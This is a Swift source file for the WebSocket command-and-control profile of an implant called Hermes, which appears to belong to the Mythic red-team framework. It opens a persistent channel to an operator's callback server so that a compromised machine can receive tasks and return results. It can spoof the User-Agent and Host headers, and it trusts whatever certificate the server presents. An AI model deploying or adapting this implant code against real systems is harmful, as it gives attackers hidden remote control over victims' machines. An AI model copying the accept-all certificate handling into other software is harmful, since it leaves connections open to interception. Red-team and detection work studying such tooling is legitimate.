//
//  websocket.swift
//  Hermes
//
//  WebSocket C2 Profile Implementation
//  Provides persistent bidirectional communication with the Mythic server
//

import Foundation

// WebSocket Profile implementation conforming to C2Profile protocol
class WebSocketProfile: C2Profile, URLSessionWebSocketDelegate {
    private var webSocketTask: URLSessionWebSocketTask?
    private var urlSession: URLSession?
    private var connected: Bool = false
    private let dispatch = DispatchGroup()
    private var pendingResponse: String = ""
    private let responseLock = NSLock()
    
    var profileName: String {
        return "websocket"
    }
    
    var isConnected: Bool {
        return connected
    }
    
    // Initialize the WebSocket connection
    func initialize() -> Bool {
        // Build WebSocket URL from agent config
        var urlComponents = URLComponents()
        urlComponents.host = agentConfig.callbackHost
        urlComponents.port = agentConfig.callbackPort
        
        if agentConfig.useSSL {
            urlComponents.scheme = "wss"
        } else {
            urlComponents.scheme = "ws"
        }
        
        // Use the WebSocket endpoint path from config
        urlComponents.path = agentConfig.websocketEndpoint
        
        guard let url = urlComponents.url else {
            print("WebSocket: Failed to construct URL")
            return false
        }
        
        // Create URL session with delegate
        let configuration = URLSessionConfiguration.ephemeral
        urlSession = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue())
        
        // Create WebSocket task with custom headers
        var request = URLRequest(url: url)
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        if !agentConfig.hostHeader.isEmpty {
            request.setValue(agentConfig.hostHeader, forHTTPHeaderField: "Host")
        }
        if !agentConfig.httpHeaders.isEmpty {
            for header in agentConfig.httpHeaders {
                request.setValue(header.value, forHTTPHeaderField: header.key)
            }
        }
        
        webSocketTask = urlSession?.webSocketTask(with: request)
        webSocketTask?.resume()
        
        // Wait for connection to establish
        dispatch.enter()
        DispatchQueue.global().asyncAfter(deadline: .now() + 5.0) {
            if !self.connected {
                self.dispatch.leave()
            }
        }
        dispatch.wait()
        
        // Start listening for messages
        if connected {
            receiveMessage()
        }
        
        return connected
    }
    
    // Send data through WebSocket and wait for response
    func send(data: String) -> String {
        guard let task = webSocketTask, connected else {
            return "NO_CONNECT"
        }
        
        responseLock.lock()
        pendingResponse = ""
        responseLock.unlock()
        
        dispatch.enter()
        
        let message = URLSessionWebSocketTask.Message.string(data)
        task.send(message) { error in
            if let error = error {
                print("WebSocket send error: \(error)")
                self.responseLock.lock()
                self.pendingResponse = "NO_CONNECT"
                self.responseLock.unlock()
                self.dispatch.leave()
            }
        }
        
        // Wait for response with timeout
        let result = dispatch.wait(timeout: .now() + 30.0)
        
        responseLock.lock()
        let response = pendingResponse.isEmpty ? "NO_CONNECT" : pendingResponse
        responseLock.unlock()
        
        if result == .timedOut {
            return "NO_CONNECT"
        }
        
        return response
    }
    
    // Receive messages from WebSocket
    private func receiveMessage() {
        webSocketTask?.receive { [weak self] result in
            guard let self = self else { return }
            
            switch result {
            case .success(let message):
                switch message {
                case .string(let text):
                    self.responseLock.lock()
                    self.pendingResponse = text
                    self.responseLock.unlock()
                    self.dispatch.leave()
                case .data(let data):
                    if let text = String(data: data, encoding: .utf8) {
                        self.responseLock.lock()
                        self.pendingResponse = text
                        self.responseLock.unlock()
                        self.dispatch.leave()
                    }
                @unknown default:
                    break
                }
                // Continue listening for more messages
                self.receiveMessage()
                
            case .failure(let error):
                print("WebSocket receive error: \(error)")
                self.connected = false
                self.responseLock.lock()
                self.pendingResponse = "NO_CONNECT"
                self.responseLock.unlock()
                self.dispatch.leave()
            }
        }
    }
    
    // Send ping to keep connection alive
    func sendPing() {
        webSocketTask?.sendPing { error in
            if let error = error {
                print("WebSocket ping error: \(error)")
                self.connected = false
            }
        }
    }
    
    // Close the WebSocket connection
    func close() {
        webSocketTask?.cancel(with: .goingAway, reason: nil)
        connected = false
    }
    
    // URLSessionWebSocketDelegate methods
    func urlSession(_ session: URLSession, webSocketTask: URLSessionWebSocketTask, didOpenWithProtocol protocol: String?) {
        connected = true
        dispatch.leave()
    }
    
    func urlSession(_ session: URLSession, webSocketTask: URLSessionWebSocketTask, didCloseWith closeCode: URLSessionWebSocketTask.CloseCode, reason: Data?) {
        connected = false
    }
    
    // Handle SSL/TLS challenges (for self-signed certificates in testing)
    func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        // Accept all certificates (similar to HTTP profile behavior)
        // In production, you may want to implement certificate pinning
        if challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust {
            if let serverTrust = challenge.protectionSpace.serverTrust {
                let credential = URLCredential(trust: serverTrust)
                completionHandler(.useCredential, credential)
                return
            }
        }
        completionHandler(.performDefaultHandling, nil)
    }
}
